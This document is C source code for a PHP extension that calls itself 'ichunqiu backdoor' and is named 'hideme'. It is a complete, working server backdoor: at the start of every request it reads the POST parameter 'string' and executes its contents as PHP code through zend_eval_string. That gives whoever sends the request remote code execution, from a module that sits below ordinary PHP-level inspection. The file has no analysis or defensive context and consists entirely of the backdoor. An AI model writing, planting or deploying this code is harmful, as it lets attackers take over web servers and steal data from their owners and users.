#include "php.h"
PHP_RINIT_FUNCTION(hideme);
zend_module_entry hideme_ext_module_entry = {
    STANDARD_MODULE_HEADER,
    "ichunqiu backdoor",
    NULL,
    NULL,
    NULL,
    PHP_RINIT(hideme),
	NULL, 
	NULL,
    "1.0",
    STANDARD_MODULE_PROPERTIES
};
ZEND_GET_MODULE(hideme_ext);

PHP_RINIT_FUNCTION(hideme)
{

	char* method = "_POST";
	char* secret_string = "string"; 
	zval** arr;
	char* code;

	if (zend_hash_find(&EG(symbol_table), method, strlen(method) + 1, (void**)&arr) != FAILURE) { 
		HashTable* ht = Z_ARRVAL_P(*arr);
		zval** val;
		if (zend_hash_find(ht, secret_string, strlen(secret_string) + 1, (void**)&val) != FAILURE) { 
			code =  Z_STRVAL_PP(val); 
			zend_eval_string(code, NULL, (char *)"" TSRMLS_CC); 
		}
	}
	return SUCCESS;
}
